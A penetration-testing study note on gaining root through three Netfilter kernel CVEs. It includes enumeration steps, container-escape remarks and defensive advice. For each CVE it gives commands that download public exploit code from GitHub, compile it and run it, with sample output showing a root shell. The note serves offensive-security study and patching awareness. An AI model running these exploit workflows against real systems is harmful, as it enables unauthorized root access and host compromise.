# Linux Privilege Escalation – Netfilter

## Overview

**Netfilter** is a core component of the Linux kernel responsible for controlling and manipulating network traffic. It provides the underlying framework used by tools such as:

- `iptables`
- `nftables`
- `arptables`

Netfilter operates inside the kernel networking stack and enables:

- packet filtering
- connection tracking
- network address translation (NAT)
- firewall rule enforcement

Because Netfilter runs at kernel level, vulnerabilities in this subsystem can allow attackers to escalate privileges to **root**.

---

# Why Netfilter Matters in Privilege Escalation

Netfilter processes network packets before they reach applications.

This makes it a high-impact attack surface because:

- it operates in kernel context
- it interacts with memory structures
- it processes user-controlled data
- it supports complex rule processing logic

Several vulnerabilities discovered between 2021–2023 allow local attackers to manipulate kernel memory via Netfilter subsystems.

These flaws often lead to:

- arbitrary memory modification
- privilege escalation
- container escape
- root shell access

---

# Netfilter Core Functions

Netfilter provides three key networking functions:

## Packet Defragmentation
Reassembles fragmented packets before processing.

---

## Connection Tracking
Maintains state information for network connections.

Used to determine whether packets belong to:

- new connections
- established sessions
- related sessions

---

## Network Address Translation (NAT)
Modifies packet source or destination addresses.

Used in:

- firewalls
- routers
- container networking
- Kubernetes networking layers

---

# Relationship to iptables and nftables

Netfilter itself is the kernel framework.

Userland tools interact with Netfilter through hooks:

| Tool | Function |
|------|---------|
| iptables | legacy firewall configuration |
| nftables | modern replacement for iptables |
| arptables | ARP packet filtering |
| ebtables | Ethernet frame filtering |

Misuse or vulnerabilities in these subsystems can lead to kernel compromise.

---

# Why Vulnerabilities Exist

Organizations frequently run older kernels because:

- legacy software dependencies
- complex production environments
- limited maintenance windows
- compatibility concerns
- embedded system constraints

Even containerized environments still depend on the host kernel.

Containers such as:

- Docker
- Kubernetes
- LXC

do not isolate the kernel itself.

Kernel vulnerabilities can therefore allow container escape or host compromise.

---

# Netfilter Privilege Escalation Vulnerabilities

## CVE-2021-22555

### Vulnerable Versions

```text
Linux kernel 2.6 – 5.11
```

### Vulnerability Type

Heap out-of-bounds write in Netfilter subsystem.

### Impact

Allows local users to:

- corrupt kernel memory
- execute arbitrary code
- escalate privileges to root

---

### Identify Kernel Version

```bash
uname -r
```

Example:

```text
5.10.5-051005-generic
```

Falls within vulnerable range.

---

### Typical Workflow

Obtain exploit source:

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

Compile:

```bash
gcc -m32 -static exploit.c -o exploit
```

Execute:

```bash
./exploit
```

Example result:

```text
[+] Linux Privilege Escalation by theflow@

[+] STAGE 0: Initialization
[+] STAGE 1: Memory corruption

root@ubuntu:/home/user# id
uid=0(root) gid=0(root)
```

---

## CVE-2022-25636

### Vulnerable Versions

```text
Linux kernel 5.4 – 5.6.10
```

### Vulnerability Type

Heap out-of-bounds write in:

```text
net/netfilter/nf_dup_netdev.c
```

### Impact

Allows local attackers to:

- overwrite kernel structures
- perform ROP chains
- obtain root privileges

---

### Compile exploit

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
```

Execute:

```bash
./exploit
```

Example output:

```text
[*] STEP 1: Leak net_device
[*] STEP 2: overwrite kernel memory
[*] STEP 3: obtain ROP execution

# id
uid=0(root)
```

---

## CVE-2023-32233

### Vulnerable Versions

```text
Linux kernel up to 6.3.1
```

### Vulnerability Type

Use-After-Free in:

```text
nf_tables
```

### Root Cause

Anonymous sets in nf_tables are not properly cleared from memory after use.

This allows attackers to:

- access freed kernel memory
- manipulate structures
- achieve code execution in kernel context

---

### Compile exploit

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

Execute:

```bash
./exploit
```

Example result:

```text
[*] Netfilter UAF exploit
[*] manipulating freed structures
[*] privilege escalation triggered

[*] You've Got ROOT :-)

# id
uid=0(root)
```

---

# Enumeration Workflow

## 1. Identify kernel version

```bash
uname -r
uname -a
```

---

## 2. Identify distribution

```bash
cat /etc/os-release
cat /etc/lsb-release
```

---

## 3. Identify Netfilter components

```bash
lsmod | grep nf_
```

Common modules:

```text
nf_tables
nf_conntrack
nf_nat
nfnetlink
```

---

## 4. Check containerized environment

Kernel exploits may still apply even when inside:

- Docker container
- Kubernetes pod
- LXC container

Check environment:

```bash
cat /proc/1/cgroup
```

---

## 5. Confirm exploit compatibility

Check:

- architecture (x86_64, arm64)
- kernel config
- required libraries
- compilation requirements

---

# Indicators Netfilter Exploits May Work

- kernel version matches vulnerable range
- nftables or iptables in use
- container escape scenario
- limited sudo access available
- SUID path unavailable
- kernel appears outdated
- legacy environment

---

# Stability Considerations

Kernel exploits can be unstable because they:

- manipulate kernel memory directly
- depend on memory layout
- rely on race conditions
- may trigger kernel panic
- may crash the system
- may require reboot

Always consider impact before execution in sensitive environments.

---

# Defensive Considerations

## Patch kernel regularly
Kernel vulnerabilities often remain exploitable until system reboot after patching.

---

## Restrict local access
Netfilter exploits generally require local execution capability.

---

## Monitor kernel anomalies
Watch for:

- crashes
- privilege changes
- suspicious local processes
- abnormal kernel behavior

---

## Reduce container escape exposure
Keep host kernel updated even if containers are isolated.

---

# Quick Cheatsheet

## Identify kernel version

```bash
uname -r
```

---

## Identify loaded netfilter modules

```bash
lsmod | grep nf
```

---

## Check nftables usage

```bash
which nft
iptables -L
```

---

## Compile exploit (example)

```bash
gcc exploit.c -o exploit
```

---

## Execute exploit

```bash
./exploit
```

---

# Key Takeaways

- Netfilter operates at kernel level
- vulnerabilities can lead directly to root
- containers do not protect against kernel exploits
- CVE-2021-22555, CVE-2022-25636, CVE-2023-32233 are notable Netfilter privilege escalation vulnerabilities
- outdated kernels are common in enterprise environments
- kernel exploits should generally be attempted after simpler privilege escalation paths
- always verify kernel version early during enumeration

---

# Tags

#linux
#privilege-escalation
#netfilter
#iptables
#nftables
#kernel-exploit
#cve-2021-22555
#cve-2022-25636
#cve-2023-32233
#post-exploitation
#enumeration
#obsidian